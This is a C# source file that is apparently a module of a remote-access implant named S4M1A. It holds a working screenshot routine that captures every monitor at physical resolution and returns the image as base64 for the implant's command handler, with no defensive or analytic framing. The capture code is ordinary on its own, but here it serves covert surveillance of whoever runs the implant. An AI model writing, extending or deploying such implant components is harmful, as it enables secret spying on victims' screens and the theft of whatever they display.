using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A Screenshot v2.1 - full virtual-screen capture to base64 PNG
    //
    //  Contract (used by Commands.cs):
    //    Screenshot.TakeB64() -> base64(PNG) or null on failure
    //
    //  v2.1 fix: DPI-aware capture. On displays scaled >100% a DPI-unaware
    //  process reads logical bounds (e.g. 1707x960 at 150%) while
    //  CopyFromScreen copies physical pixels, so only the top-left corner
    //  of the screen was captured. SetProcessDPIAware() + physical
    //  virtual-screen metrics (GetSystemMetrics) fix it for any scaling
    //  and for multi-monitor layouts (union = all monitors).
    // =====================================================================

    public static class Screenshot
    {
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        // SM_XVIRTUALSCREEN / SM_YVIRTUALSCREEN / SM_CXVIRTUALSCREEN / SM_CYVIRTUALSCREEN
        private const int SM_XVIRTUALSCREEN = 76;
        private const int SM_YVIRTUALSCREEN = 77;
        private const int SM_CXVIRTUALSCREEN = 78;
        private const int SM_CYVIRTUALSCREEN = 79;

        static Screenshot()
        {
            try { SetProcessDPIAware(); } catch { }
        }

        public static string TakeB64()
        {
            try
            {
                Rectangle bounds = FullScreenBounds();
                if (bounds.Width <= 0 || bounds.Height <= 0) return null;

                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height,
                                               PixelFormat.Format32bppArgb))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size,
                                         CopyPixelOperation.SourceCopy);
                    }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Png);
                        byte[] data = ms.ToArray();
                        return Convert.ToBase64String(data);
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        // Physical-pixel union of every monitor (DPI-safe).
        private static Rectangle FullScreenBounds()
        {
            int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
            int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
            int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
            if (w > 0 && h > 0)
                return new Rectangle(x, y, w, h);

            // Fallback: union of Screen bounds (DPI-unaware fallback).
            Rectangle r = Rectangle.Empty;
            foreach (Screen s in Screen.AllScreens)
                r = r.IsEmpty ? s.Bounds : Rectangle.Union(r, s.Bounds);
            return r;
        }
    }
}
